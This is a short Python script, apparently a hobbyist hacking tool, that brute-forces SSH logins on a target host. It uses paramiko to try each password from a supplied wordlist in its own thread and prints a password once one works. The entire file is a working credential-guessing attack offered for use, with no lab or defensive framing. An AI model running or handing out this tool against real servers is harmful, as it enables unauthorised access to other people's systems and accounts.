#!/usr/bin/env python3

# This Script BruteForces towards SSH
# You need a .txt file in combo with this script
# CyberSamurai DK

import paramiko, sys, os, socket, termcolor
import threading, time

stop_flag = 0


def ssh_connect(password, code=0):
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(lhost, port=22, username=username, password=password)
        stop_flag = 1
        print(termcolor.colored(('[+] (^‿^) Found Password:' + password + ', For User: ' + username), 'green'))
    except:
        print(termcolor.colored(('[-] Incorrect Login: ' + password), 'red'))
    ssh.close()


lhost = input('[!] (ง •̀_•́)ง Target SSH Address: ')
username = input('[!] (ง •̀_•́)ง Input SSH Username: ')
input_file = input('[!] (ง •̀_•́)ง Path to .txt file: ')

if os.path.exists(input_file) == False:
    print('[-] That File/Path Does Not Exist')
    sys.exit(1)

print(' * (⌐■_■) Starting SSH BruteForce On ' + lhost + ' With Account: ' + username + ' (■_■⌐) *')


with open(input_file, 'r') as file:
    for line in file.readlines():
        if stop_flag == 1:
            t.join()
            exit()
        password = line.strip()
        t = threading.Thread(target=ssh_connect, args=(password,))
        t.start()
        time.sleep(0.5)